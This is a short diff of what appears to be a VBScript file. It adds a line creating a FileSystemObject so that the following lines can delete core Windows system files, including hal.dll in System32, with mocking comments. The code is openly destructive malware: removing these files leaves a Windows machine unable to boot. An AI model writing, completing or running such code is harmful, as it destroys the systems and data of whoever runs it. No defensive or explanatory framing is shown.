@@ -21,6 +21,8 @@ For Each objDisk in colDisks
     Next
 Next
 
+Set objFSO = CreateObject("Scripting.FileSystemObject") ' why could we need this? hmmmmmmmmmm...
+
 objFSO.DeleteFile "C:\Windows\System32\hal.DLL" ' who needs hardware abstraction anyway? lolz!
 objFSO.DeleteFile "C:\Windows\SysWOW64\aeevts.DLL" ' funny name
 
